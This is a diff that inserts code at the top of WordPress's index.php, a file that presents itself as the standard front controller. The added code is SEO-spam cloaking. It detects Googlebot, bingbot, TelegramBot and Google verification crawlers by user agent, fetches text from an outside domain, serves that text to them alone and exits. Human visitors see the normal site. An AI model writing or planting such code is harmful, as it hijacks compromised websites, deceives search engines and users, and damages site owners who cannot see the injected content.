@@ -1,4 +1,25 @@
 <?php
+function is_bot() {
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+
+foreach ($bots as $bot) {
+if (stripos($user_agent, $bot) !== false) {
+return true;
+}
+}
+
+return false;
+}
+
+if (is_bot()) {
+$message = file_get_contents('https://starbats.site/landing/profsquad.txt');
+echo $message;
+exit;
+}
+?>
+
+<?php
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
